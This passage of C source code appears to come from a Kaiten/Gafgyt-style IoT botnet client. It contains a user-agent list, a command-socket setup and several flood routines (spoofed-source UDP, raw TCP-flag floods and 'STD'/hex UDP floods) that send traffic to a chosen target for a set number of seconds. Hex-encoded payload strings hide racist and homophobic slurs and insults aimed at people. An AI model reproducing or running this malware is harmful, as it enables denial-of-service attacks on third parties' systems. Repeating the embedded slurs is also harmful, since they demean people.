"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
"Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
"Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
"W3C_Validator/1.432.2.10",
"W3C_Validator/1.305.2.12 libwww-perl/5.64",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
};// Kaiten User Agent List

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)// Hax
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;  
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void VixSTD(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
 
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
 
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
   
    unsigned char *rhexstring = malloc(1024);
    memset(rhexstring, 0, 1024);
 
    unsigned int a = 0;
    while(1){
        if(a >= 50){
            rhexstring = newStr[rand() % (sizeof(newStr) / sizeof(char *))];
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if(time(NULL) >= start + secs){
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

  void SendSTDHEX(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
    "\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64",
    "\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73",
    "\x64\x69\x73\x63\x6f\x72\x64\x20\x64\x6f\x74\x20\x67\x67\x20\x73\x6c\x61\x73\x68\x20\x62\x64\x64\x48\x7a\x47\x67\x4b\x47\x37",
    "VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...",
    "\x6a\x61\x79\x20\x69\x73\x20\x61\x20\x66\x61\x67\x67\x6f\x74",
    "\x61\x64\x64\x20\x69\x6c\x6c\x75\x6d\x69\x6e\x61\x74\x65\x23\x30\x30\x33\x38\x20\x66\x6f\x72\x20\x67\x61\x79\x20\x73\x65\x78"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}


    void SendKTN(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendASIAN(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}


    void SendLIZARDS(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
